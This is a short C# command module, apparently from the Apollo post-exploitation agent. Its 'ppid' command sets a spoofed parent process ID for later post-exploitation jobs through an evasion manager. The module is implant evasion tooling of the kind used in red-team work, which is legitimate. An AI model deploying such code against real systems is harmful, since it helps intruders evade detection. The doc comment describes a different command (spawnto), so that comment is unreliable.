#define COMMAND_NAME_UPPER

#if DEBUG
#undef PPID
#define PPID
#endif

#if PPID
using System;
using System.Linq;
using System.Text;
using Apollo.Jobs;
using Apollo.Tasks;
using Apollo.Evasion;
using Newtonsoft.Json;

namespace Apollo.CommandModules
{
    class Ppid
    {

        public struct PpidArgs
        {
            public int ppid;
        }

        /// <summary>
        /// Change the sacrificial process that's spawned for certain post-exploitation jobs
        /// such as execute assembly. Valid taskings are spawnto_x64 and spawnto_x86. If the
        /// file does not exist or the file is not of an executable file type, the job
        /// will return an error message.
        /// </summary>
        /// <param name="job">Job associated with this task. The filepath is specified by job.Task.parameters.</param>
        /// <param name="agent">Agent this task is run on.</param>
        /// 
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            PpidArgs args = JsonConvert.DeserializeObject<PpidArgs>(job.Task.parameters);

            int pid = args.ppid;
            if (EvasionManager.SetParentProcessId(pid))
            {
                job.SetComplete($"Set parent process ID of post-ex jobs to {pid}");
            } else
            {
                job.SetError($"Failed to set parent process ID to {pid}. Ensure process with ID {pid} is running.");
            }
        }
    }
}
#endif